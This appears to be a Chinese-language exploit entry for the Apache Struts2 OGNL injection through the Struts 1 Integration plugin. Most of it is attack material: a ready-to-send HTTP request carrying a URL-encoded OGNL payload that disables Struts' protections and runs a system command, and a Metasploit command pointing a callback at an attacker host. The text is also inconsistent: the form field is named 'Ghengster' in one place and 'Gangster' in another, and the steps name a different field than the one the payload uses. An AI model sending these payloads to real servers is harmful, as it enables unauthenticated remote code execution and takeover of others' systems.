## 漏洞描述

Struts2 在使用 Struts 1 Integration 插件时，通过 Ghengster Name 表单字段提交的数据会被进行 OGNL 表达式解析。攻击者可以构造恶意输入执行任意命令。

## 影响版本

- Apache Struts 2.0.0 - 2.3.32

## 前置条件

- 无需认证
- 目标应用使用 Struts 1 Integration 插件

## 利用步骤

1. 访问 Struts 1 Integration 页面
2. 在 Gangster Name 表单中注入 OGNL 表达式

## Payload

```http
POST /showcase/integration/saveGangster.action HTTP/1.1
Host: target:8080
Content-Type: application/x-www-form-urlencoded

name=test&age=25&__checkbox_bannedBefore=true&bannedBefore=false&description=%25%7B%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%7D.%23_%5FmemberAccess%3F(%23_memberAccess%3D%23dm)%3A((%23container%3D%23context%5B'com.opensymphony.xwork2.ActionContext.container'%5D).(%23ognlUtil%3D%23container.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ognlUtil.getExcludedPackageNames().clear()).(%23ognlUtil.getExcludedClasses().clear()).(%23context.setMemberAccess(%23dm)))..(%23q%3D%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('id').getInputStream())).(%23q)%7D
```



Metasploit 利用:
```bash
msfconsole -q -x "use exploit/multi/http/struts2_showcase_ognl; set RHOSTS target; set TARGETURI /struts2-showcase/; set RPORT 8080; set ACTION saveGangster; set LHOST attacker_ip; run"
```
